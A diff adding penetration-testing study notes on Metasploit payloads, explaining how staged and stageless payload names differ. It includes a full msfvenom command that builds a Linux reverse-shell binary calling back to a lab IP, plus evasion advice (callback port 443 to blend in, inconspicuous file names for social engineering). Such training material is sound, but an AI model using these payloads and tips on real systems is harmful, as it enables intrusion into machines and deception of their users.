@@ -190,6 +190,41 @@ Payload components downloaded by stagers. Provide advanced features with no size
 
 Naming: `<target>/<stage>/<stager>` — e.g., `windows/meterpreter/reverse_tcp`
 
+### Staged vs Stageless — Identifying by Name
+
+The payload name tells you whether it is staged or stageless:
+
+* **Staged** — a `/` separates the shell from the connection method: `windows/meterpreter/reverse_tcp`
+* **Stageless** — the shell and connection are joined with `_`: `windows/meterpreter_reverse_tcp`
+
+One more pair for clarity:
+
+| Payload | Type |
+|---|---|
+| `linux/x86/shell/reverse_tcp` | Staged |
+| `linux/x86/shell_reverse_tcp` | Stageless |
+
+**When to use staged**: Target has reliable, low-latency network connectivity. The smaller initial stager is less likely to be caught during delivery, and the full stage is pulled down after the channel is established.
+
+**When to use stageless**: Environments with limited bandwidth or high latency where a staged connection may drop before the full payload downloads. Stageless can also be better for evasion since less traffic crosses the network. Also preferred for social engineering delivery (email, USB) since the payload is self-contained.
+
+---
+
+## MSFvenom Command Breakdown
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+```
+
+| Flag | Purpose |
+|---|---|
+| `msfvenom` | Payload generation tool |
+| `-p linux/x64/shell_reverse_tcp` | Payload: Linux 64-bit stageless TCP reverse shell |
+| `LHOST=10.10.14.113` | Callback IP address |
+| `LPORT=443` | Callback port (use common ports like 443 to blend with normal traffic) |
+| `-f elf` | Output format — ELF binary for Linux (use `exe` for Windows) |
+| `> createbackup.elf` | Output file name (name it something inconspicuous for social engineering) |
+
 ### Searching and Selecting Payloads
 
 ```
